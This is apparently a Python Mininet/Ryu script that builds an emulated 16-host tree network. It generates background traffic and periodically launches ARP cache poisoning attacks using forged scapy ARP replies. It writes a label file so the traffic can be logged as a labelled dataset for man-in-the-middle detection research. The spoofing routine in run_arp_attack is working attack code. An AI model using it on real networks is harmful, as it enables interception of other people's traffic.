# """
# Tree Topology: depth=2, fanout=4
# =================================
# 1 root switch -> 4 aggregation switches -> 4 hosts each = 16 hosts total
# No loops, works with simple flooding controller.
# All hosts on 10.0.0.0/8 flat subnet.

# Start ORDER:
#   Terminal 1: ryu-manager flow_logger.py   <-- controller FIRST
#   Terminal 2: sudo python3 topology.py     <-- topology SECOND
# """

# from mininet.net import Mininet
# from mininet.node import RemoteController, OVSSwitch
# from mininet.cli import CLI
# from mininet.log import setLogLevel
# from mininet.link import TCLink
# import subprocess
# import time
# import threading
# import random


# def build_tree(net):
#     """
#     Tree topology: 1 root + 4 agg switches + 16 hosts
#     s0 -> s1,s2,s3,s4 -> h1..h16
#     """
#     hosts = []

#     root = net.addSwitch('s0', cls=OVSSwitch, protocols='OpenFlow13', failMode='secure', dpid='0000000000000001')

#     hnum = 1
#     for i in range(1, 5):
#         agg = net.addSwitch(f's{i}', cls=OVSSwitch, protocols='OpenFlow13', failMode='secure', dpid=f'000000000000000{i+1}')
#         net.addLink(root, agg, cls=TCLink, bw=100, delay='1ms')
#         for j in range(4):
#             ip   = f'10.0.0.{hnum + 1}'
#             host = net.addHost(f'h{hnum}', ip=f'{ip}/8')
#             net.addLink(agg, host, cls=TCLink, bw=100, delay='2ms')
#             hosts.append(host)
#             hnum += 1

#     return hosts


# def install_table_miss(delay=2):
#     """Install table-miss rule on all OVS bridges via ovs-ofctl."""
#     time.sleep(delay)
#     bridges = subprocess.check_output('sudo ovs-vsctl list-br', shell=True).decode().split()
#     for br in bridges:
#         br = br.strip()
#         if br:
#             subprocess.call(
#                 f'sudo ovs-ofctl -O OpenFlow13 add-flow {br} "priority=0,actions=CONTROLLER:65535"',
#                 shell=True
#             )
#             print(f'[*] Table-miss installed on {br}')


# def start_traffic(hosts):
#     def ping_loop():
#         time.sleep(3)
#         while True:
#             try:
#                 src, dst = random.sample(hosts, 2)
#                 src.cmd(f'ping -c {random.randint(5, 20)} -i 0.2 {dst.IP()} > /dev/null 2>&1 &')
#             except Exception:
#                 pass
#             time.sleep(random.uniform(2, 5))

#     def iperf_loop():
#         time.sleep(5)
#         try:
#             server = hosts[0]
#             server.cmd('iperf -s -p 5201 -D > /dev/null 2>&1')
#         except Exception:
#             return
#         time.sleep(1)
#         while True:
#             try:
#                 client = random.choice(hosts[1:])
#                 t = random.randint(5, 15)
#                 client.cmd(f'iperf -c {server.IP()} -p 5201 -t {t} > /dev/null 2>&1 &')
#             except Exception:
#                 pass
#             time.sleep(random.uniform(10, 25))

#     def http_loop():
#         time.sleep(5)
#         try:
#             server = hosts[1]
#             server.cmd('python3 -m http.server 8080 > /dev/null 2>&1 &')
#         except Exception:
#             return
#         time.sleep(1)
#         while True:
#             try:
#                 client = random.choice(hosts[2:])
#                 client.cmd(f'curl -s http://{server.IP()}:8080/ > /dev/null 2>&1 &')
#             except Exception:
#                 pass
#             time.sleep(random.uniform(3, 8))

#     def arp_loop():
#         time.sleep(5)  # wait for hosts to be fully ready
#         while True:
#             try:
#                 src, dst = random.sample(hosts, 2)
#                 src.cmd(f'arping -c 2 -I {src.defaultIntf()} {dst.IP()} > /dev/null 2>&1 &')
#             except Exception:
#                 pass
#             time.sleep(random.uniform(8, 20))

#     for fn in [ping_loop, iperf_loop, http_loop, arp_loop]:
#         threading.Thread(target=fn, daemon=True).start()
#     print('[traffic] Started: ping, iperf, HTTP, ARP')


# def run():
#     setLogLevel('info')

#     net = Mininet(controller=RemoteController, switch=OVSSwitch, link=TCLink, autoSetMacs=True)
#     net.addController('c0', controller=RemoteController, ip='127.0.0.1', port=6633)

#     print('[*] Building tree topology (depth=2, fanout=4, 16 hosts)...')
#     hosts = build_tree(net)
#     net.start()

#     print(f'[*] {len(hosts)} hosts started:')
#     for h in hosts:
#         print(f'    {h.name}  {h.IP()}')

#     # Install table-miss rules on all switches
#     install_table_miss(delay=3)

#     # Verify connectivity before starting traffic
#     print('[*] Testing h1 -> h2 ping...')
#     result = hosts[0].cmd(f'ping -c 3 -W 2 {hosts[1].IP()}')
#     if '0 received' in result:
#         print('[!] WARNING: Ping failed - check controller is running')
#         print(result)
#     else:
#         print('[*] Connectivity OK')

#     start_traffic(hosts)
#     print('[*] Traffic running. flow_logger.py collecting to normal_flows.csv')
#     print('[*] Type exit to stop.\n')

#     CLI(net)
#     net.stop()


# if __name__ == '__main__':
#     run()
"""
Attack Collection Topology
===========================
Runs background traffic + automatic ARP attacks.
Writes /tmp/mitm_label (0 or 1) so flow_logger labels rows correctly.

Normal traffic during attack windows still gets label=0
Attack traffic gets label=1

Run:
  Terminal 1: ryu-manager flow_logger_attack.py
  Terminal 2: sudo python3 topo_attack.py
"""

from mininet.net import Mininet
from mininet.node import RemoteController, OVSSwitch
from mininet.cli import CLI
from mininet.log import setLogLevel
from mininet.link import TCLink
from scapy.all import ARP, Ether, sendp, get_if_hwaddr

import subprocess
import time
import threading
import random
import os

LABEL_FILE = '/tmp/mitm_label'

# Attack config
ATTACK_PAIRS = [
    # (attacker_idx, victim1_idx, victim2_idx) — indices into host list
    (2, 0, 1),    # h3 attacks h1, h2
    (4, 5, 6),    # h5 attacks h6, h7
    (7, 0, 3),    # h8 attacks h1, h4
    (9, 1, 5),    # h10 attacks h2, h6
    (11, 2, 8),   # h12 attacks h3, h9
]

MIN_NORMAL_WINDOW = 30   # seconds of normal traffic between attacks
MAX_NORMAL_WINDOW = 60
MIN_ATTACK_WINDOW = 20   # seconds per attack
MAX_ATTACK_WINDOW = 40


def set_label(val):
    """Write current label to shared flag file."""
    with open(LABEL_FILE, 'w') as f:
        f.write(str(val))


def build_tree(net):
    hosts = []
    root  = net.addSwitch('s0', cls=OVSSwitch, protocols='OpenFlow13',
                          failMode='secure', dpid='0000000000000001')
    hnum  = 1
    for i in range(1, 5):
        agg = net.addSwitch(f's{i}', cls=OVSSwitch, protocols='OpenFlow13',
                            failMode='secure', dpid=f'00000000000000{i+1:02d}')
        net.addLink(root, agg, cls=TCLink, bw=100, delay='1ms')
        for j in range(4):
            ip   = f'10.0.0.{hnum + 1}'
            host = net.addHost(f'h{hnum}', ip=f'{ip}/8')
            net.addLink(agg, host, cls=TCLink, bw=100, delay='2ms')
            hosts.append(host)
            hnum += 1
    return hosts


def install_table_miss(delay=3):
    time.sleep(delay)
    bridges = subprocess.check_output('sudo ovs-vsctl list-br', shell=True).decode().split()
    for br in bridges:
        br = br.strip()
        if br:
            subprocess.call(
                f'sudo ovs-ofctl -O OpenFlow13 add-flow {br} '
                f'"priority=0,actions=CONTROLLER:65535"',
                shell=True
            )
            print(f'[*] Table-miss installed on {br}')


def start_background_traffic(hosts):
    """Normal background traffic — always running."""

    def ping_loop():
        time.sleep(3)
        while True:
            try:
                src, dst = random.sample(hosts, 2)
                src.cmd(f'ping -c {random.randint(5, 15)} -i 0.2 '
                        f'{dst.IP()} > /dev/null 2>&1 &')
            except Exception:
                pass
            time.sleep(random.uniform(2, 5))

    def iperf_loop():
        time.sleep(5)
        try:
            server = hosts[0]
            server.cmd('iperf -s -p 5201 -D > /dev/null 2>&1')
        except Exception:
            return
        time.sleep(1)
        while True:
            try:
                client = random.choice(hosts[1:])
                t = random.randint(5, 15)
                client.cmd(f'iperf -c {server.IP()} -p 5201 -t {t} '
                           f'> /dev/null 2>&1 &')
            except Exception:
                pass
            time.sleep(random.uniform(10, 25))

    def http_loop():
        time.sleep(5)
        try:
            server = hosts[1]
            server.cmd('python3 -m http.server 8080 > /dev/null 2>&1 &')
        except Exception:
            return
        time.sleep(1)
        while True:
            try:
                client = random.choice(hosts[2:])
                client.cmd(f'curl -s http://{server.IP()}:8080/ '
                           f'> /dev/null 2>&1 &')
            except Exception:
                pass
            time.sleep(random.uniform(3, 8))

    for fn in [ping_loop, iperf_loop, http_loop]:
        threading.Thread(target=fn, daemon=True).start()
    print('[traffic] Background traffic started')


def run_arp_attack(attacker_host, victim1_host, victim2_host, duration):
    """
    Send ARP poison packets from attacker to both victims.
    Runs for `duration` seconds.
    """
    iface = attacker_host.defaultIntf().name

    try:
        attacker_mac = attacker_host.MAC()
    except Exception:
        attacker_mac = 'ff:ff:ff:ff:ff:ff'

    attacker_ip = attacker_host.IP()
    victim1_ip  = victim1_host.IP()
    victim2_ip  = victim2_host.IP()

    print(f'[attack] {attacker_host.name}({attacker_ip}) -> '
          f'{victim1_host.name}({victim1_ip}) + {victim2_host.name}({victim2_ip}) '
          f'for {duration}s')

    end = time.time() + duration
    while time.time() < end:
        try:
            # Tell victim1 that victim2's IP is at attacker's MAC
            attacker_host.cmd(
                f'python3 -c "'
                f'from scapy.all import ARP,Ether,sendp;'
                f'sendp(Ether(dst=\'ff:ff:ff:ff:ff:ff\')/ARP(op=2,pdst=\'{victim1_ip}\','
                f'psrc=\'{victim2_ip}\',hwsrc=\'{attacker_mac}\'),'
                f'iface=\'{iface}\',verbose=False)" 2>/dev/null'
            )
            # Tell victim2 that victim1's IP is at attacker's MAC
            attacker_host.cmd(
                f'python3 -c "'
                f'from scapy.all import ARP,Ether,sendp;'
                f'sendp(Ether(dst=\'ff:ff:ff:ff:ff:ff\')/ARP(op=2,pdst=\'{victim2_ip}\','
                f'psrc=\'{victim1_ip}\',hwsrc=\'{attacker_mac}\'),'
                f'iface=\'{iface}\',verbose=False)" 2>/dev/null'
            )
        except Exception:
            pass
        time.sleep(1.5)


def attack_orchestrator(hosts):
    """
    Automatically schedules attacks with normal traffic gaps between them.
    Updates /tmp/mitm_label so flow_logger knows current label.
    """
    time.sleep(10)  # let normal traffic establish first
    print('[orchestrator] Starting attack schedule')

    while True:
        # Normal window
        gap = random.uniform(MIN_NORMAL_WINDOW, MAX_NORMAL_WINDOW)
        print(f'[orchestrator] Normal window: {gap:.0f}s — label=0')
        set_label(0)
        time.sleep(gap)

        # Pick random attack pair
        pair = random.choice(ATTACK_PAIRS)
        attacker = hosts[pair[0]]
        victim1  = hosts[pair[1]]
        victim2  = hosts[pair[2]]
        duration = random.uniform(MIN_ATTACK_WINDOW, MAX_ATTACK_WINDOW)

        print(f'[orchestrator] Attack window: {duration:.0f}s — label=1')
        set_label(1)
        run_arp_attack(attacker, victim1, victim2, duration)

        # Reset label immediately after attack
        set_label(0)
        print('[orchestrator] Attack ended — label=0')


def run():
    setLogLevel('info')

    # Initialize label file as normal
    set_label(0)

    net = Mininet(controller=RemoteController, switch=OVSSwitch,
                  link=TCLink, autoSetMacs=True)
    net.addController('c0', controller=RemoteController,
                      ip='127.0.0.1', port=6633)

    print('[*] Building tree topology...')
    hosts = build_tree(net)
    net.start()

    print(f'[*] {len(hosts)} hosts:')
    for h in hosts:
        print(f'    {h.name}  {h.IP()}')

    install_table_miss(delay=3)

    # Verify connectivity
    print('[*] Testing h1 -> h2 ping...')
    result = hosts[0].cmd(f'ping -c 3 -W 2 {hosts[1].IP()}')
    if '0 received' in result:
        print('[!] WARNING: ping failed — check controller')
    else:
        print('[*] Connectivity OK')

    start_background_traffic(hosts)

    # Start attack orchestrator in background
    threading.Thread(target=attack_orchestrator, args=(hosts,), daemon=True).start()
    print('[*] Attack orchestrator running in background')
    print('[*] Watch flow_logger_attack.py terminal for label switches')
    print('[*] Type exit to stop\n')

    CLI(net)
    set_label(0)
    net.stop()


if __name__ == '__main__':
    run()